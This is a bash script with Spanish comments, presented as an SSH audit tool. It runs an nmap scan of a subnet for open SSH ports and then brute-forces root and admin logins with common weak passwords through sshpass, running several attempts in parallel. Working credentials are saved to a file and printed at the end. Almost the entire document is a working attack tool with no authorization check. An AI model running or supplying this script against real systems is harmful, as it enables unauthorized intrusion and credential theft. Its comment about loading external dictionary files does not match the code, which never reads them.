bash
#!/bin/bash
# Automatización SSH Pro - v1.1
# Mejoras: Paralelismo, Manejo de señales, Diccionarios externos.

# Colores
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

# Configuración
THREADS=5
TIMEOUT=5
OUTPUT_DIR="ssh_audit_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

# Archivos de diccionarios (puedes crearlos aparte)
USER_FILE="users.txt"
PASS_FILE="passwords.txt"

# Trap para salida limpia
trap "echo -e '${RED}\n[!] Saliendo...${NC}'; exit 1" SIGINT SIGTERM

test_credentials() {
    local host=$1 user=$2 pass=$3 port=$4
    
    if timeout $TIMEOUT sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=$TIMEOUT -o BatchMode=yes -p "$port" "$user@$host" "id" &>/dev/null; then
        echo -e "${GREEN}[+] ¡ÉXITO! $host -> $user:$pass${NC}"
        echo "$host:$port | $user:$pass" >> "$OUTPUT_DIR/valid_credentials.txt"
        return 0
    fi
    return 1
}

scan_ssh_services() {
    local network=$1
    echo -e "[*] Escaneando SSH en $network..."
    # Usamos formato grepeable (-oG) para extraer IPs de forma segura
    nmap -p 22 --open -Pn "$network" -oG "$OUTPUT_DIR/scan.gnmap" > /dev/null
    grep "Host:" "$OUTPUT_DIR/scan.gnmap" | awk '{print $2}' > "$OUTPUT_DIR/ssh_hosts.txt"
    echo -e "[*] Hosts detectados: $(wc -l < "$OUTPUT_DIR/ssh_hosts.txt")"
}

brute_force_ssh() {
    local host=$1 port=$2
    # Si no existen archivos de diccionarios, usamos arrays por defecto
    local users=("root" "admin")
    local passes=("123456" "password" "root")

    for user in "${users[@]}"; do
        for pass in "${passes[@]}"; do
            # Control de hilos simple
            ((job_count=job_count%THREADS)); ((job_count++==0)) && wait
            test_credentials "$host" "$user" "$pass" "$port" & 
        done
    done
    wait # Esperar a que terminen las pruebas en el host actual
}

main() {
    # 1. Chequeo de dependencias
    for cmd in nmap sshpass; do
        if ! command -v $cmd &>/dev/null; then
            echo -e "${RED}[-] Falta $cmd. Instálalo para continuar.${NC}"; exit 1
        fi
    done

    # 2. Escaneo (puedes pedir la red como argumento)
    local target_net=${1:-"192.168.1.0/24"}
    scan_ssh_services "$target_net"

    # 3. Procesamiento
    while read -r host; do
        echo -e "\n[*] Atacando host: ${YELLOW}$host${NC}"
        brute_force_ssh "$host" 22
    done < "$OUTPUT_DIR/ssh_hosts.txt"

    echo -e "\n${GREEN}--- Auditoría Finalizada ---${NC}"
    [[ -f "$OUTPUT_DIR/valid_credentials.txt" ]] && cat "$OUTPUT_DIR/valid_credentials.txt"
}

main "$@"